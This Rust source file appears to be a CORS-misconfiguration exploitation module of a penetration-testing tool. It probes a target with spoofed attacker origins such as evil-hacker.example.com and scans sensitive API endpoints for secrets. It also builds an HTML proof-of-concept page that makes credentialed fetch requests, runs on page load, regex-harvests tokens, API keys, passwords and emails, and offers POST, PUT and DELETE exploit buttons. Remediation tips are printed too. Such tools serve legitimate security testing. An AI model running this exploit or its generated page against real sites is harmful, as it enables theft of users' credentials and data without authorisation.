use crate::utils::{error::FortiCoreResult, FortiCoreError};
use colored::*;
use futures::future::join_all;
use regex::Regex;
use reqwest::{
    header::{HeaderMap, HeaderValue, ACCEPT, CONTENT_TYPE, ORIGIN, REFERER, USER_AGENT},
    Client,
};
use serde_json::{json, Value};
use std::collections::HashSet;
use url::Url;

// Common sensitive endpoints that might be vulnerable
const SENSITIVE_ENDPOINTS: [&str; 12] = [
    "/api/user",
    "/api/users",
    "/api/profile",
    "/api/account",
    "/user/data",
    "/api/admin",
    "/api/settings",
    "/api/config",
    "/api/auth",
    "/api/token",
    "/api/v1/users",
    "/dashboard",
];

#[derive(Debug)]
struct CorsVulnerability {
    endpoint: String,
    allowed_origin: String,
    allow_credentials: bool,
    allowed_headers: Vec<String>,
    allowed_methods: Vec<String>,
    reflected_origin: bool,
    wildcarded: bool,
    preflight_required: bool,
    sensitive_data_detected: bool,
}

pub async fn exploit(target: &str, safe_mode: bool, verbose: bool) -> FortiCoreResult<()> {
    println!(
        "{}",
        "Starting enhanced CORS Misconfiguration exploitation module...".bright_yellow()
    );

    if !safe_mode {
        println!(
            "{}",
            "Warning: Safe mode is disabled. Running full CORS exploits with active tests."
                .bright_red()
        );
    }

    // Normalize URL
    let target_url = normalize_url(target);
    let parsed_url = Url::parse(&target_url)
        .map_err(|e| FortiCoreError::InputError(format!("Invalid URL format: {}", e)))?;
    let base_domain = parsed_url.host_str().ok_or_else(|| {
        FortiCoreError::InputError("Could not extract domain from URL".to_string())
    })?;

    if verbose {
        println!("Targeting URL: {}", target_url);
        println!("Base domain: {}", base_domain);
    }

    // Create HTTP client with appropriate headers
    let client = create_client()?;

    // Phase 1: Testing base URL
    println!(
        "{}",
        "Phase 1: Initial CORS vulnerability assessment...".bright_blue()
    );

    // Testing with different origins
    let test_origins = generate_test_origins(base_domain);
    let mut vulnerable_origins = Vec::new();

    for origin in test_origins {
        if verbose {
            println!("Testing with Origin: {}", origin);
        }

        let (is_vulnerable, acao_value, allow_credentials, headers, methods) =
            test_cors_with_origin(&client, &target_url, &origin).await?;

        if is_vulnerable {
            println!(
                "{}",
                format!("Vulnerable to CORS with Origin: {}", origin).bright_red()
            );
            vulnerable_origins.push((origin, acao_value, allow_credentials, headers, methods));
        }
    }

    if vulnerable_origins.is_empty() {
        println!(
            "{}",
            "No basic CORS misconfiguration detected on main endpoint.".bright_yellow()
        );
    } else {
        println!(
            "{}",
            format!(
                "Found {} vulnerable CORS configurations!",
                vulnerable_origins.len()
            )
            .bright_red()
        );

        for (origin, acao, creds, headers, methods) in &vulnerable_origins {
            println!(
                "Origin: {} | ACAO: {} | Credentials: {} | Headers: {} | Methods: {}",
                origin,
                acao,
                if *creds {
                    "allowed".bright_red()
                } else {
                    "not allowed".normal()
                },
                headers.join(", "),
                methods.join(", ")
            );
        }
    }

    // Phase 2: Deep scanning for vulnerable endpoints
    println!(
        "\n{}",
        "Phase 2: Deep scanning for vulnerable endpoints...".bright_blue()
    );

    let mut vulnerable_endpoints = Vec::new();

    // If we have vulnerable origins, use the first one for endpoint testing
    let test_origin = if !vulnerable_origins.is_empty() {
        vulnerable_origins[0].0.clone()
    } else {
        "https://evil-hacker.example.com".to_string()
    };

    // Test common endpoints
    for endpoint in SENSITIVE_ENDPOINTS.iter() {
        let endpoint_url = format!("{}{}", target_url.trim_end_matches('/'), endpoint);
        if verbose {
            println!("Testing endpoint: {}", endpoint_url);
        }

        let (is_vulnerable, acao_value, allow_credentials, headers, methods) =
            test_cors_with_origin(&client, &endpoint_url, &test_origin).await?;

        if is_vulnerable {
            println!(
                "{}",
                format!("Vulnerable endpoint found: {}", endpoint).bright_red()
            );

            let vuln = CorsVulnerability {
                endpoint: endpoint.to_string(),
                allowed_origin: acao_value.clone(),
                allow_credentials,
                allowed_headers: headers.clone(),
                allowed_methods: methods.clone(),
                reflected_origin: acao_value == test_origin,
                wildcarded: acao_value == "*",
                preflight_required: !methods.contains(&"GET".to_string()),
                sensitive_data_detected: check_sensitive_patterns(&endpoint_url, &client).await?,
            };

            vulnerable_endpoints.push(vuln);
        }
    }

    // Phase 3: Test HTTP methods and advanced exploitation
    if !safe_mode && !vulnerable_endpoints.is_empty() {
        println!(
            "\n{}",
            "Phase 3: Advanced CORS exploitation...".bright_red()
        );

        for vuln in &vulnerable_endpoints {
            println!(
                "Testing advanced exploitation on endpoint: {}",
                vuln.endpoint.bright_yellow()
            );

            // Try different HTTP methods if allowed
            if vuln.allow_credentials {
                println!(
                    "‚ùó This endpoint allows credentials! High-severity vulnerability detected."
                );

                // For non-safe mode, perform more aggressive testing
                let endpoint_url = format!("{}{}", target_url.trim_end_matches('/'), vuln.endpoint);

                if vuln.allowed_methods.contains(&"POST".to_string()) {
                    println!("Testing POST method exploitation...");
                    let simulation_result =
                        simulate_post_exploitation(&client, &endpoint_url, &test_origin).await?;
                    if simulation_result {
                        println!("{}", "POST method is exploitable!".bright_red());
                    }
                }

                if vuln.allowed_methods.contains(&"PUT".to_string()) {
                    println!("Testing PUT method exploitation...");
                    let simulation_result =
                        simulate_put_exploitation(&client, &endpoint_url, &test_origin).await?;
                    if simulation_result {
                        println!("{}", "PUT method is exploitable!".bright_red());
                    }
                }
            }
        }
    }

    // Phase 4: Generate PoC and report
    println!(
        "\n{}",
        "Phase 4: Generating exploitation PoC...".bright_blue()
    );

    // Create a more sophisticated PoC for the first vulnerable endpoint
    if !vulnerable_endpoints.is_empty() {
        let vuln = &vulnerable_endpoints[0];
        let endpoint_url = format!("{}{}", target_url.trim_end_matches('/'), vuln.endpoint);
        let exploit_origin = if !vulnerable_origins.is_empty() {
            &vulnerable_origins[0].0
        } else {
            "https://evil-hacker.example.com"
        };

        println!("Creating PoC for endpoint: {}", endpoint_url);
        let poc_html = create_advanced_cors_poc(
            &endpoint_url,
            exploit_origin,
            vuln.allow_credentials,
            &vuln.allowed_methods,
        );

        println!("Proof of Concept HTML (save to a file and open in a browser):");
        println!("{}", poc_html.bright_green());
    } else if !vulnerable_origins.is_empty() {
        // If we have a vulnerable base URL but no specific endpoints
        let (origin, acao, creds, _, _) = &vulnerable_origins[0];
        let poc_html =
            create_advanced_cors_poc(&target_url, origin, *creds, &vec!["GET".to_string()]);

        println!("Proof of Concept HTML (save to a file and open in a browser):");
        println!("{}", poc_html.bright_green());
    } else {
        println!("{}", "No vulnerabilities found to create a PoC.".yellow());
    }

    // Provide detailed remediation guidance
    println!("\n{}", "Remediation recommendations:".bright_yellow());
    println!("1. Implement proper CORS policy with specific trusted origins only");
    println!("2. Avoid using wildcards (*) in production environments");
    println!("3. For APIs, restrict the Access-Control-Allow-Origin header to trusted domains");
    println!("4. If dynamic origins are needed, validate them against a whitelist");
    println!(
        "5. Set appropriate Access-Control-Allow-Credentials to false for sensitive endpoints"
    );
    println!("6. Carefully restrict Access-Control-Allow-Methods to only required methods");
    println!("7. Implement proper CSRF protections even with proper CORS");
    println!("8. Consider using the Vary: Origin header when varying responses");
    println!("9. Implement proper Content-Security-Policy headers");

    // Create JSON result with vulnerability details
    let mut result = json!({
        "target": target_url,
        "cors_tested": true,
        "vulnerable": !vulnerable_origins.is_empty() || !vulnerable_endpoints.is_empty(),
        "severity": if vulnerable_endpoints.iter().any(|v| v.allow_credentials) {
            "Critical"
        } else if !vulnerable_endpoints.is_empty() {
            "High"
        } else if !vulnerable_origins.is_empty() {
            "Medium"
        } else {
            "Low"
        }
    });

    // Add vulnerable origins
    if !vulnerable_origins.is_empty() {
        let origins_json: Vec<Value> = vulnerable_origins
            .iter()
            .map(|(origin, acao, creds, headers, methods)| {
                json!({
                    "origin": origin,
                    "acao_value": acao,
                    "allows_credentials": creds,
                    "allowed_headers": headers,
                    "allowed_methods": methods
                })
            })
            .collect();

        result["vulnerable_origins"] = json!(origins_json);
    }

    // Add vulnerable endpoints
    if !vulnerable_endpoints.is_empty() {
        let endpoints_json: Vec<Value> = vulnerable_endpoints
            .iter()
            .map(|v| {
                json!({
                    "endpoint": v.endpoint,
                    "allowed_origin": v.allowed_origin,
                    "allows_credentials": v.allow_credentials,
                    "allowed_headers": v.allowed_headers,
                    "allowed_methods": v.allowed_methods,
                    "reflects_origin": v.reflected_origin,
                    "wildcarded": v.wildcarded,
                    "preflight_required": v.preflight_required,
                    "sensitive_data_detected": v.sensitive_data_detected
                })
            })
            .collect();

        result["vulnerable_endpoints"] = json!(endpoints_json);
    }

    // Store the result using add_exploit_result
    let vulnerability = crate::scanners::Vulnerability {
        id: "WEB-003".to_string(),
        name: "CORS Misconfiguration".to_string(),
        description: "Misconfigured CORS headers allowing unauthorized origins to access resources"
            .to_string(),
        severity: if vulnerable_endpoints.iter().any(|v| v.allow_credentials) {
            crate::scanners::Severity::Critical
        } else if !vulnerable_endpoints.is_empty() {
            crate::scanners::Severity::High
        } else if !vulnerable_origins.is_empty() {
            crate::scanners::Severity::Medium
        } else {
            crate::scanners::Severity::Low
        },
        location: target_url,
        exploitable: true,
        details: result.clone(), // Store the JSON result here
    };

    add_exploit_result(
        if vulnerable_origins.is_empty() && vulnerable_endpoints.is_empty() {
            ExploitResult::Failed {
                vulnerability,
                reason: "No CORS misconfigurations detected".to_string(),
            }
        } else {
            ExploitResult::Success {
                vulnerability,
                details: result,
            }
        },
    );

    Ok(())
}
// Generate different origins for testing CORS misconfigurations
fn generate_test_origins(base_domain: &str) -> Vec<String> {
    let mut origins = Vec::new();

    // Extract parts of the domain
    let parts: Vec<&str> = base_domain.split('.').collect();

    // Add standard test origins
    origins.push("https://evil-hacker.example.com".to_string());
    origins.push("null".to_string()); // Special "null" origin

    // Try domain variations
    if parts.len() >= 2 {
        // Subdomain bypass
        origins.push(format!("https://evil.{}", base_domain));

        // Parent domain
        if parts.len() > 2 {
            let parent = parts[parts.len() - 2..].join(".");
            origins.push(format!("https://{}", parent));
        }

        // Try domain with a prefix
        origins.push(format!("https://{}evil.com", parts[0]));

        // Try domain with a suffix
        origins.push(format!("https://{}.evil.com", parts[0]));
    }

    // Add some special cases
    origins.push(format!("https://{}", base_domain)); // HTTPS version
    origins.push(format!("http://{}", base_domain)); // HTTP version
    origins.push(format!("{}:{}", base_domain, 8080)); // With different port
    origins.push(format!("https://{}%60.evil.com", base_domain)); // Backtick injection

    origins
}

async fn test_cors_with_origin(
    client: &Client,
    url: &str,
    origin: &str,
) -> FortiCoreResult<(bool, String, bool, Vec<String>, Vec<String>)> {
    // First do a GET request to test basic CORS
    let resp = client
        .get(url)
        .header(ORIGIN, origin)
        .send()
        .await
        .map_err(|e| {
            FortiCoreError::NetworkError(format!("Failed to connect to {}: {}", url, e))
        })?;

    let headers = resp.headers();
    let mut is_vulnerable = false;
    let mut acao_value = String::new();
    let mut allow_credentials = false;
    let mut allowed_headers = Vec::new();
    let mut allowed_methods = vec!["GET".to_string()]; // Default GET is working

    // Check Access-Control-Allow-Origin header
    if let Some(acao) = headers.get("Access-Control-Allow-Origin") {
        let value = acao.to_str().unwrap_or("");
        acao_value = value.to_string();

        // Check for vulnerability conditions
        if value == "*" || value == origin || (value.contains(origin) && origin != "null") {
            is_vulnerable = true;
        }
    }

    // Check Access-Control-Allow-Credentials
    if let Some(acac) = headers.get("Access-Control-Allow-Credentials") {
        let value = acac.to_str().unwrap_or("");
        if value.to_lowercase() == "true" {
            allow_credentials = true;
        }
    }

    // Check Access-Control-Allow-Headers
    if let Some(acah) = headers.get("Access-Control-Allow-Headers") {
        let value = acah.to_str().unwrap_or("");
        allowed_headers = value.split(',').map(|s| s.trim().to_string()).collect();
    }

    // Do an OPTIONS request to test preflight
    let resp_options = client
        .request(reqwest::Method::OPTIONS, url)
        .header(ORIGIN, origin)
        .header("Access-Control-Request-Method", "POST")
        .header("Access-Control-Request-Headers", "Content-Type")
        .send()
        .await;

    if let Ok(options_resp) = resp_options {
        let options_headers = options_resp.headers();

        // Check allowed methods
        if let Some(acam) = options_headers.get("Access-Control-Allow-Methods") {
            let methods = acam.to_str().unwrap_or("");
            allowed_methods = methods.split(',').map(|s| s.trim().to_string()).collect();
        }

        // Check if OPTIONS preflight is also vulnerable
        if let Some(acao) = options_headers.get("Access-Control-Allow-Origin") {
            let value = acao.to_str().unwrap_or("");
            if value == "*" || value == origin || (value.contains(origin) && origin != "null") {
                // Update credentials check from OPTIONS too
                if let Some(acac) = options_headers.get("Access-Control-Allow-Credentials") {
                    let value = acac.to_str().unwrap_or("");
                    if value.to_lowercase() == "true" {
                        allow_credentials = true;
                    }
                }
            }
        }
    }

    Ok((
        is_vulnerable,
        acao_value,
        allow_credentials,
        allowed_headers,
        allowed_methods,
    ))
}

async fn check_sensitive_patterns(url: &str, client: &Client) -> FortiCoreResult<bool> {
    // Define patterns that might indicate sensitive data
    let sensitive_patterns = [
        r#""token"\s*:\s*"[\w\.]+"#,
        r#""api[\w]*key"\s*:\s*"[\w\.]+"#,
        r#""password"\s*:\s*"[\w\.]+"#,
        r#""secret"\s*:\s*"[\w\.]+"#,
        r#""id"\s*:\s*\d+"#,
        r#""user[\w]*id"\s*:\s*\d+"#,
        r#""email"\s*:\s*"[^"@]+@[^"@]+"#,
    ];

    // Make a regular GET request without exploiting CORS
    let resp = client.get(url).send().await.map_err(|e| {
        FortiCoreError::NetworkError(format!("Failed to connect to {}: {}", url, e))
    })?;

    if !resp.status().is_success() {
        return Ok(false);
    }

    let content = resp.text().await.unwrap_or_default();

    // Check for sensitive patterns
    for pattern in &sensitive_patterns {
        let regex = Regex::new(pattern).unwrap();
        if regex.is_match(&content) {
            return Ok(true);
        }
    }

    Ok(false)
}

async fn simulate_post_exploitation(
    client: &Client,
    url: &str,
    origin: &str,
) -> FortiCoreResult<bool> {
    // This is a simulation - it doesn't actually try to post malicious data
    // but checks if the server accepts POST requests with CORS
    let resp = client
        .request(reqwest::Method::OPTIONS, url)
        .header(ORIGIN, origin)
        .header("Access-Control-Request-Method", "POST")
        .header("Access-Control-Request-Headers", "Content-Type")
        .send()
        .await
        .map_err(|e| FortiCoreError::NetworkError(format!("Failed preflight to {}: {}", url, e)))?;

    let headers = resp.headers();

    if let Some(acao) = headers.get("Access-Control-Allow-Origin") {
        let value = acao.to_str().unwrap_or("");

        if (value == "*" || value == origin) && headers.contains_key("Access-Control-Allow-Methods")
        {
            let methods = headers["Access-Control-Allow-Methods"]
                .to_str()
                .unwrap_or("");
            if methods.contains("POST") {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

async fn simulate_put_exploitation(
    client: &Client,
    url: &str,
    origin: &str,
) -> FortiCoreResult<bool> {
    // Similar to POST test but for PUT
    let resp = client
        .request(reqwest::Method::OPTIONS, url)
        .header(ORIGIN, origin)
        .header("Access-Control-Request-Method", "PUT")
        .header("Access-Control-Request-Headers", "Content-Type")
        .send()
        .await
        .map_err(|e| FortiCoreError::NetworkError(format!("Failed preflight to {}: {}", url, e)))?;

    let headers = resp.headers();

    if let Some(acao) = headers.get("Access-Control-Allow-Origin") {
        let value = acao.to_str().unwrap_or("");

        if (value == "*" || value == origin) && headers.contains_key("Access-Control-Allow-Methods")
        {
            let methods = headers["Access-Control-Allow-Methods"]
                .to_str()
                .unwrap_or("");
            if methods.contains("PUT") {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

fn create_advanced_cors_poc(
    target_url: &str,
    origin: &str,
    allow_credentials: bool,
    allowed_methods: &Vec<String>,
) -> String {
    let mut poc = String::new();

    poc.push_str("<!DOCTYPE html>\n");
    poc.push_str("<html>\n<head>\n");
    poc.push_str("    <title>Advanced CORS Vulnerability PoC</title>\n");
    poc.push_str("    <style>\n");
    poc.push_str("        body { font-family: Arial, sans-serif; margin: 20px; }\n");
    poc.push_str("        h1 { color: #d9534f; }\n");
    poc.push_str("        .container { max-width: 900px; margin: 0 auto; }\n");
    poc.push_str("        .card { border: 1px solid #ddd; padding: 15px; margin-bottom: 15px; border-radius: 4px; }\n");
    poc.push_str("        .btn { background-color: #d9534f; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; }\n");
    poc.push_str("        .success { color: #5cb85c; }\n");
    poc.push_str("        .error { color: #d9534f; }\n");
    poc.push_str("        pre { background-color: #f5f5f5; padding: 10px; border-radius: 4px; overflow: auto; max-height: 300px; }\n");
    poc.push_str("    </style>\n");
    poc.push_str("</head>\n<body>\n");
    poc.push_str("    <div class=\"container\">\n");
    poc.push_str("        <h1>CORS Vulnerability Exploitation</h1>\n");
    poc.push_str("        <div class=\"card\">\n");
    poc.push_str("            <h3>Target Information</h3>\n");
    poc.push_str("            <p><strong>URL:</strong> ");
    poc.push_str(target_url);
    poc.push_str("</p>\n");
    poc.push_str("            <p><strong>Origin:</strong> ");
    poc.push_str(origin);
    poc.push_str("</p>\n");
    poc.push_str("            <p><strong>Credentials:</strong> ");
    poc.push_str(if allow_credentials {
        "Allowed (High Severity)"
    } else {
        "Not Allowed"
    });
    poc.push_str("</p>\n");
    poc.push_str("            <p><strong>Methods:</strong> ");
    poc.push_str(&allowed_methods.join(", "));
    poc.push_str("</p>\n");
    poc.push_str("        </div>\n\n");

    poc.push_str("        <div class=\"card\">\n");
    poc.push_str("            <h3>Exploitation Actions</h3>\n");
    poc.push_str(
        "            <button class=\"btn\" onclick=\"exploitGET()\">Exploit with GET</button> ",
    );

    if allowed_methods.contains(&"POST".to_string()) {
        poc.push_str("<button class=\"btn\" onclick=\"exploitPOST()\">Exploit with POST</button> ");
    }

    if allowed_methods.contains(&"PUT".to_string()) {
        poc.push_str("<button class=\"btn\" onclick=\"exploitPUT()\">Exploit with PUT</button> ");
    }

    if allowed_methods.contains(&"DELETE".to_string()) {
        poc.push_str(
            "<button class=\"btn\" onclick=\"exploitDELETE()\">Exploit with DELETE</button>",
        );
    }

    poc.push_str("        </div>\n\n");

    poc.push_str("        <div class=\"card\">\n");
    poc.push_str("            <h3>Results</h3>\n");
    poc.push_str("            <div id=\"status\"></div>\n");
    poc.push_str("            <div id=\"result\"></div>\n");
    poc.push_str("        </div>\n");

    poc.push_str("        <div class=\"card\">\n");
    poc.push_str("            <h3>Information Extraction</h3>\n");
    poc.push_str("            <div>\n");
    poc.push_str("                <p>Data found:</p>\n");
    poc.push_str("                <ul id=\"extracted-data\"></ul>\n");
    poc.push_str("            </div>\n");
    poc.push_str("        </div>\n");
    poc.push_str("    </div>\n\n");

    poc.push_str("    <script>\n");
    poc.push_str("        // Helper function to extract sensitive data\n");
    poc.push_str("        function extractSensitiveData(data) {\n");
    poc.push_str("            const patterns = [\n");
    poc.push_str("                { name: 'API Key', regex: /[\"']api[_-]?key[\"']\\s*:\\s*[\"']([^\"']+)[\"']/gi },\n");
    poc.push_str("                { name: 'Auth Token', regex: /[\"'](?:token|auth|jwt)[\"']\\s*:\\s*[\"']([^\"']+)[\"']/gi },\n");
    poc.push_str("                { name: 'User ID', regex: /[\"'](?:user|account)[_-]?id[\"']\\s*:\\s*([\"']\\d+[\"']|\\d+)/gi },\n");
    poc.push_str("                { name: 'Email', regex: /[\"']email[\"']\\s*:\\s*[\"']([^\"'@]+@[^\"']+)[\"']/gi },\n");
    poc.push_str("                { name: 'Password', regex: /[\"']password[\"']\\s*:\\s*[\"']([^\"']+)[\"']/gi },\n");
    poc.push_str("                { name: 'Secret', regex: /[\"']secret[\"']\\s*:\\s*[\"']([^\"']+)[\"']/gi },\n");
    poc.push_str("            ];\n");
    poc.push_str("            \n");
    poc.push_str("            const extractedList = document.getElementById('extracted-data');\n");
    poc.push_str("            extractedList.innerHTML = '';\n");
    poc.push_str("            let foundItems = 0;\n");
    poc.push_str("            \n");
    poc.push_str("            patterns.forEach(pattern => {\n");
    poc.push_str("                let match;\n");
    poc.push_str("                while ((match = pattern.regex.exec(data)) !== null) {\n");
    poc.push_str("                    const item = document.createElement('li');\n");
    poc.push_str("                    item.innerHTML = `<strong>${pattern.name}:</strong> <code>${match[1]}</code>`;\n");
    poc.push_str("                    extractedList.appendChild(item);\n");
    poc.push_str("                    foundItems++;\n");
    poc.push_str("                }\n");
    poc.push_str("            });\n");
    poc.push_str("            \n");
    poc.push_str("            if (foundItems === 0) {\n");
    poc.push_str("                const item = document.createElement('li');\n");
    poc.push_str("                item.textContent = 'No sensitive data patterns found';\n");
    poc.push_str("                extractedList.appendChild(item);\n");
    poc.push_str("            }\n");
    poc.push_str("        }\n\n");

    // Add the CORS exploitation functions
    poc.push_str("        function updateStatus(message, isError = false) {\n");
    poc.push_str("            const status = document.getElementById('status');\n");
    poc.push_str("            status.innerHTML = `<p class=\"${isError ? 'error' : 'success'}\">${message}</p>`;\n");
    poc.push_str("        }\n\n");

    poc.push_str("        function updateResult(data) {\n");
    poc.push_str("            const result = document.getElementById('result');\n");
    poc.push_str("            result.innerHTML = `<p>Data retrieved:</p><pre>${data}</pre>`;\n");
    poc.push_str("            \n");
    poc.push_str("            // Try to extract sensitive data\n");
    poc.push_str("            extractSensitiveData(data);\n");
    poc.push_str("        }\n\n");

    // GET exploitation function
    poc.push_str("        async function exploitGET() {\n");
    poc.push_str("            updateStatus('Attempting CORS exploitation with GET...');\n");
    poc.push_str("            try {\n");
    poc.push_str("                const response = await fetch('");
    poc.push_str(target_url);
    poc.push_str("', {\n");
    poc.push_str("                    method: 'GET',\n");

    if allow_credentials {
        poc.push_str("                    credentials: 'include',\n");
    }

    poc.push_str("                    headers: {\n");
    poc.push_str("                        'Accept': 'application/json, text/plain, */*'\n");
    poc.push_str("                    }\n");
    poc.push_str("                });\n");
    poc.push_str("                \n");
    poc.push_str("                if (response.ok) {\n");
    poc.push_str("                    const data = await response.text();\n");
    poc.push_str("                    updateStatus('GET request successful! CORS vulnerability confirmed!');\n");
    poc.push_str("                    updateResult(data);\n");
    poc.push_str("                } else {\n");
    poc.push_str("                    updateStatus(`GET request failed with status: ${response.status}`, true);\n");
    poc.push_str("                }\n");
    poc.push_str("            } catch (error) {\n");
    poc.push_str("                updateStatus(`Error: ${error.message}`, true);\n");
    poc.push_str("            }\n");
    poc.push_str("        }\n\n");

    // Add POST exploitation if allowed
    if allowed_methods.contains(&"POST".to_string()) {
        // POST exploitation function
        poc.push_str("        async function exploitPOST() {\n");
        poc.push_str("            updateStatus('Attempting CORS exploitation with POST...');\n");
        poc.push_str("            try {\n");
        poc.push_str("                const response = await fetch('");
        poc.push_str(target_url);
        poc.push_str("', {\n");
        poc.push_str("                    method: 'POST',\n");

        if allow_credentials {
            poc.push_str("                    credentials: 'include',\n");
        }

        poc.push_str("                    headers: {\n");
        poc.push_str("                        'Content-Type': 'application/json',\n");
        poc.push_str("                        'Accept': 'application/json, text/plain, */*'\n");
        poc.push_str("                    },\n");
        poc.push_str("                    body: JSON.stringify({\n");
        poc.push_str("                        'action': 'test',\n");
        poc.push_str("                        'timestamp': new Date().toISOString()\n");
        poc.push_str("                    })\n");
        poc.push_str("                });\n");
        poc.push_str("                \n");
        poc.push_str("                if (response.ok) {\n");
        poc.push_str("                    const data = await response.text();\n");
        poc.push_str("                    updateStatus('POST request successful! High severity CORS vulnerability confirmed!');\n");
        poc.push_str("                    updateResult(data);\n");
        poc.push_str("                } else {\n");
        poc.push_str("                    updateStatus(`POST request failed with status: ${response.status}`, true);\n");
        poc.push_str("                }\n");
        poc.push_str("            } catch (error) {\n");
        poc.push_str("                updateStatus(`Error: ${error.message}`, true);\n");
        poc.push_str("            }\n");
        poc.push_str("        }\n\n");
    }

    // Add PUT exploitation if allowed
    if allowed_methods.contains(&"PUT".to_string()) {
        poc.push_str("        async function exploitPUT() {\n");
        poc.push_str("            updateStatus('Attempting CORS exploitation with PUT...');\n");
        poc.push_str("            try {\n");
        poc.push_str("                const response = await fetch('");
        poc.push_str(target_url);
        poc.push_str("', {\n");
        poc.push_str("                    method: 'PUT',\n");

        if allow_credentials {
            poc.push_str("                    credentials: 'include',\n");
        }

        poc.push_str("                    headers: {\n");
        poc.push_str("                        'Content-Type': 'application/json',\n");
        poc.push_str("                        'Accept': 'application/json, text/plain, */*'\n");
        poc.push_str("                    },\n");
        poc.push_str("                    body: JSON.stringify({\n");
        poc.push_str("                        'update': 'data',\n");
        poc.push_str("                        'timestamp': new Date().toISOString()\n");
        poc.push_str("                    })\n");
        poc.push_str("                });\n");
        poc.push_str("                \n");
        poc.push_str("                if (response.ok) {\n");
        poc.push_str("                    const data = await response.text();\n");
        poc.push_str("                    updateStatus('PUT request successful! Critical CORS vulnerability confirmed!');\n");
        poc.push_str("                    updateResult(data);\n");
        poc.push_str("                } else {\n");
        poc.push_str("                    updateStatus(`PUT request failed with status: ${response.status}`, true);\n");
        poc.push_str("                }\n");
        poc.push_str("            } catch (error) {\n");
        poc.push_str("                updateStatus(`Error: ${error.message}`, true);\n");
        poc.push_str("            }\n");
        poc.push_str("        }\n\n");
    }

    // Add DELETE exploitation if allowed
    if allowed_methods.contains(&"DELETE".to_string()) {
        poc.push_str("        async function exploitDELETE() {\n");
        poc.push_str("            updateStatus('Attempting CORS exploitation with DELETE...');\n");
        poc.push_str("            try {\n");
        poc.push_str("                const response = await fetch('");
        poc.push_str(target_url);
        poc.push_str("', {\n");
        poc.push_str("                    method: 'DELETE',\n");

        if allow_credentials {
            poc.push_str("                    credentials: 'include',\n");
        }

        poc.push_str("                    headers: {\n");
        poc.push_str("                        'Accept': 'application/json, text/plain, */*'\n");
        poc.push_str("                    }\n");
        poc.push_str("                });\n");
        poc.push_str("                \n");
        poc.push_str("                if (response.ok) {\n");
        poc.push_str("                    const data = await response.text();\n");
        poc.push_str("                    updateStatus('DELETE request successful! Critical CORS vulnerability confirmed!');\n");
        poc.push_str("                    updateResult(data);\n");
        poc.push_str("                } else {\n");
        poc.push_str("                    updateStatus(`DELETE request failed with status: ${response.status}`, true);\n");
        poc.push_str("                }\n");
        poc.push_str("            } catch (error) {\n");
        poc.push_str("                updateStatus(`Error: ${error.message}`, true);\n");
        poc.push_str("            }\n");
        poc.push_str("        }\n\n");
    }

    // Add automatic exploitation function
    poc.push_str("        // Advanced exploitation: Automatically extract and exfiltrate data\n");
    poc.push_str("        async function autoExploit() {\n");
    poc.push_str("            updateStatus('Starting automatic exploitation...');\n");
    poc.push_str("            \n");
    poc.push_str("            // First try GET to avoid modifying data\n");
    poc.push_str("            try {\n");
    poc.push_str("                await exploitGET();\n");
    poc.push_str("                \n");
    poc.push_str(
        "                // Send extracted data to attacker server (demonstration only)\n",
    );
    poc.push_str("                const extractedData = document.getElementById('extracted-data').innerHTML;\n");
    poc.push_str("                console.log('In a real attack, this data would be sent to the attacker\\'s server:');\n");
    poc.push_str("                console.log(extractedData);\n");
    poc.push_str("                \n");
    poc.push_str("                updateStatus('Automatic exploitation completed. Check browser console for demo exfiltration.');\n");
    poc.push_str("            } catch (error) {\n");
    poc.push_str(
        "                updateStatus(`Automatic exploitation error: ${error.message}`, true);\n",
    );
    poc.push_str("            }\n");
    poc.push_str("        }\n\n");

    // Execute automatically if credentials are allowed (high severity)
    if allow_credentials {
        poc.push_str("        // Auto-execute when page loads due to high severity\n");
        poc.push_str("        window.addEventListener('load', () => {\n");
        poc.push_str("            setTimeout(exploitGET, 1000); // Start after 1 second\n");
        poc.push_str("        });\n");
    }

    poc.push_str("    </script>\n");
    poc.push_str("</body>\n</html>");

    poc
}

fn normalize_url(url: &str) -> String {
    if !url.starts_with("http://") && !url.starts_with("https://") {
        format!("http://{}", url)
    } else {
        url.to_string()
    }
}

fn create_client() -> FortiCoreResult<Client> {
    let mut headers = HeaderMap::new();
    headers.insert(
        USER_AGENT,
        HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"),
    );
    headers.insert(
        ACCEPT,
        HeaderValue::from_static(
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        ),
    );
    headers.insert(REFERER, HeaderValue::from_static("https://www.google.com/"));

    let client = Client::builder()
        .default_headers(headers)
        .timeout(std::time::Duration::from_secs(15))
        .redirect(reqwest::redirect::Policy::limited(5))
        .build()
        .map_err(|e| {
            FortiCoreError::NetworkError(format!("Failed to create HTTP client: {}", e))
        })?;

    Ok(client)
}
